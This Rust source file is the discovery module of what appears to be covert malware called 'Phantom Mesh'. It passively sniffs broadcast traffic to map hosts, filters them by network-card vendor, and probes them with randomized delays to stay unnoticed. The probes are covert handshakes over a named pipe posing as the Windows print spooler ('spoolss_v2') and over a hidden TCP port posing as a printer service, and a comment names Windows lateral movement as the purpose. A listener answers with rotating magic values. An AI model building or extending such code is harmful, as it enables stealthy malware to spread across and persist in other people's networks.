use pnet::datalink::{self, Channel};
use pnet::packet::Packet;
use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::udp::UdpPacket;
use std::collections::HashMap;
use std::time::{Instant, Duration};
use std::sync::{Arc, Mutex};
use log::{info, warn};
use tokio::time::sleep;
use rand::Rng;

use crate::crypto::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};

// OUI Constants (Allowed: Intel, Realtek, Microsoft)
const ALLOWED_OUIS: &[&[u8; 3]] = &[
    &[0x00, 0x1B, 0x21], // Intel (Example)
    &[0x00, 0xE0, 0x4C], // Realtek (Example)
    &[0x00, 0x50, 0xF2], // Microsoft (Example)
    // Add real OUIs here
];

const FILTER_PORTS: &[u16] = &[5353, 1900, 137, 67, 68, 31338];

struct TargetInfo {
    ip: String,
    mac: [u8; 6],
    last_seen: Instant,
    hits: u32,
}

pub struct ZeroNoiseDiscovery {
    shadow_map: Arc<Mutex<HashMap<String, TargetInfo>>>, // IP -> Info
}

impl ZeroNoiseDiscovery {
    pub fn new() -> Self {
        Self {
            shadow_map: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn register_discovered_peer(&self, ip: &str) {
        info!("peer: {}", ip);
        if let Ok(mut map) = self.shadow_map.lock() {
            if let Some(entry) = map.get_mut(ip) {
                entry.hits += 100;
            }
        }
    }


    pub async fn run_daemon(&self) {
        info!("disc: start");

        // 1. Start Sniffer Background Task
        let map_clone = self.shadow_map.clone();
        std::thread::spawn(move || {
            start_sniffer(map_clone);
        });

        // 2. Start Covert Handshake Listener (Linux/macOS only)
        #[cfg(not(target_os = "windows"))]
        {
            tokio::spawn(async {
                start_covert_listener().await;
            });
        }

        // 3. Periodic Analysis & Probing
        loop {
            // Random 30-90s per search cycle
            let cycle_delay = rand::thread_rng().gen_range(30..=90);
            sleep(Duration::from_secs(cycle_delay)).await; 
            self.analyze_and_probe().await;
        }
    }

    async fn analyze_and_probe(&self) {
        let targets = {
            let mut map = match self.shadow_map.lock() {
                Ok(m) => m,
                Err(_) => return,
            };
            let now = Instant::now();
            
            // Prune old entries
            map.retain(|_, v| now.duration_since(v.last_seen).as_secs() < 1200);

            // Filter Candidates (Patient Hunter: > 3 hits)
            map.iter()
                .filter(|(_, v)| v.hits >= 3)
                .map(|(k, _)| k.clone())
                .collect::<Vec<String>>()
        };

        info!("disc: {} candidates", targets.len());

        for target in targets {
            // Small Jitter Delay (2-10s) to avoid instant spikes, but faster than before
            let delay = rand::thread_rng().gen_range(2..=10);
            info!("probe: {} in {}s", target, delay);
            sleep(Duration::from_secs(delay)).await;

            if self.try_covert_handshake(&target).await {
                info!("found: {}", target);
                self.register_discovered_peer(&target);
                break;
            }
        }
    }

    /// Attempt a covert handshake with a potential peer
    /// Windows: Named Pipe (spoolss_v2)
    /// Linux: Hidden TCP port (disguised as printer service)
    #[cfg(target_os = "windows")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use tokio::net::windows::named_pipe::ClientOptions;
        use tokio::io::AsyncWriteExt;
        use log::debug;

        // Try Named Pipe first (common for Windows lateral movement)
        let pipe_path = format!(r"\\{}\pipe\spoolss_v2", ip);
        debug!("[Discovery] Probing Pipe: {}", pipe_path);

        match ClientOptions::new().open(&pipe_path) {
            Ok(mut client) => {
                let magic = handshake_magic().to_be_bytes();
                if client.write_all(&magic).await.is_err() {
                    return false;
                }
                true
            }
            Err(_) => false,
        }
    }

    /// Linux: Use TCP connection to a covert port (mimics printer service)
    #[cfg(target_os = "linux")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use tokio::net::TcpStream;
        use tokio::io::{AsyncWriteExt, AsyncReadExt};
        use std::time::Duration;
        use log::debug;

        // Covert port that looks like IPP (Internet Printing Protocol)
        const COVERT_PORT: u16 = 9631; // Similar to 631 (CUPS), but obscure
        
        let addr = format!("{}:{}", ip, COVERT_PORT);
        debug!("[Discovery] Probing TCP: {}", addr);

        // Short timeout to avoid blocking
        let connect = tokio::time::timeout(
            Duration::from_secs(2),
            TcpStream::connect(&addr)
        ).await;

        match connect {
            Ok(Ok(mut stream)) => {
                // Send magic handshake
                let magic = handshake_magic().to_be_bytes();
                if stream.write_all(&magic).await.is_err() {
                    return false;
                }

                // Wait for response (should echo magic XOR'd with node marker)
                let mut response = [0u8; 4];
                match tokio::time::timeout(
                    Duration::from_secs(1),
                    stream.read_exact(&mut response)
                ).await {
                    Ok(Ok(_)) => {
                        // Verify response: magic XOR 0xEFD5493C
                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                        response == expected
                    }
                    _ => false,
                }
            }
            _ => false,
        }
    }

    /// macOS: Use Unix domain socket in /tmp
    #[cfg(target_os = "macos")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use tokio::net::TcpStream;
        use tokio::io::{AsyncWriteExt, AsyncReadExt};
        use std::time::Duration;
        use log::debug;

        // Same TCP approach as Linux
        const COVERT_PORT: u16 = 9631;
        
        let addr = format!("{}:{}", ip, COVERT_PORT);
        debug!("[Discovery] Probing TCP: {}", addr);

        let connect = tokio::time::timeout(
            Duration::from_secs(2),
            TcpStream::connect(&addr)
        ).await;

        match connect {
            Ok(Ok(mut stream)) => {
                let magic = handshake_magic().to_be_bytes();
                if stream.write_all(&magic).await.is_err() {
                    return false;
                }

                let mut response = [0u8; 4];
                match tokio::time::timeout(
                    Duration::from_secs(1),
                    stream.read_exact(&mut response)
                ).await {
                    Ok(Ok(_)) => {
                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                        response == expected
                    }
                    _ => false,
                }
            }
            _ => false,
        }
    }
}

// ============================================================================
// COVERT HANDSHAKE LISTENER (Linux/macOS)
// ============================================================================

/// Listen for incoming covert handshakes on TCP port 9631
/// Responds with dynamic magic to prove we're a Phantom Mesh node
#[cfg(not(target_os = "windows"))]
async fn start_covert_listener() {
    use tokio::net::TcpListener;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use log::{info, debug, warn};

    const COVERT_PORT: u16 = 9631;

    let bind_addr = format!("0.0.0.0:{}", COVERT_PORT);
    
    let listener = match TcpListener::bind(&bind_addr).await {
        Ok(l) => {
            info!("[Discovery] Covert listener started on port {}", COVERT_PORT);
            l
        }
        Err(e) => {
            warn!("[Discovery] Failed to bind covert port {}: {}", COVERT_PORT, e);
            return;
        }
    };

    loop {
        match listener.accept().await {
            Ok((mut stream, addr)) => {
                debug!("[Discovery] Covert connection from {}", addr);
                
                tokio::spawn(async move {
                    // Get current + previous magic values for tolerance
                    let current_magic = handshake_magic();
                    let prev_magic = handshake_magic_prev();
                    let current_xor = handshake_xor();
                    
                    // Read magic handshake
                    let mut buf = [0u8; 4];
                    if stream.read_exact(&mut buf).await.is_err() {
                        return;
                    }

                    let received = u32::from_be_bytes(buf);
                    // Accept current or previous slot magic
                    if received != current_magic && received != prev_magic {
                        // Not our handshake, close silently
                        return;
                    }

                    // Send response: magic XOR'd (use the magic they sent)
                    let response = (received ^ current_xor).to_be_bytes();
                    let _ = stream.write_all(&response).await;
                    
                    info!("[Discovery] Covert handshake completed with {}", addr);
                });
            }
            Err(e) => {
                warn!("[Discovery] Accept error: {}", e);
            }
        }
    }
}

fn start_sniffer(map: Arc<Mutex<HashMap<String, TargetInfo>>>) {
    // Select interface (dumb selection for now: first non-loopback)
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
        .filter(|iface| !iface.is_loopback() && iface.is_up() && !iface.ips.is_empty())
        .next();

    if let Some(iface) = interface {
        info!("[Stealth] Sniffing on Interface: {}", iface.name);
        
        let (_, mut rx) = match datalink::channel(&iface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => { warn!("Unhandled Channel Type"); return; },
            Err(e) => { warn!("Failed to create channel: {}", e); return; }
        };

        loop {
            match rx.next() {
                Ok(packet) => {
                    let eth = match EthernetPacket::new(packet) {
                        Some(e) => e,
                        None => continue,
                    };
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ip_packet) = Ipv4Packet::new(eth.payload()) {
                            // Filter UDP Broadcasts
                            if ip_packet.get_next_level_protocol() == pnet::packet::ip::IpNextHeaderProtocols::Udp {
                                if let Some(udp) = UdpPacket::new(ip_packet.payload()) {
                                    let dest_port = udp.get_destination();
                                    if FILTER_PORTS.contains(&dest_port) {
                                        let src_ip = ip_packet.get_source().to_string();
                                        let src_mac = eth.get_source().octets();

                                        let oui: [u8; 3] = [src_mac[0], src_mac[1], src_mac[2]];
                                        let oui_allowed = ALLOWED_OUIS.iter().any(|allowed| **allowed == oui);
                                        if !oui_allowed {
                                            continue;
                                        }

                                        let mut map_lock = match map.lock() {
                                            Ok(m) => m,
                                            Err(_) => continue,
                                        };
                                        let entry = map_lock.entry(src_ip.clone()).or_insert(TargetInfo {
                                            ip: src_ip,
                                            mac: src_mac,
                                            last_seen: Instant::now(),
                                            hits: 0,
                                        });
                                        entry.last_seen = Instant::now();
                                        entry.hits += 1;
                                        
                                        // debug!("[Stealth] Shadow Map Updated: {} (Hits: {})", entry.ip, entry.hits);
                                    }
                                }
                            }
                        }
                    }
                },
                Err(_) => continue,
            }
        }
    } else {
        warn!("[Stealth] No suitable interface found for sniffing.");
    }
}
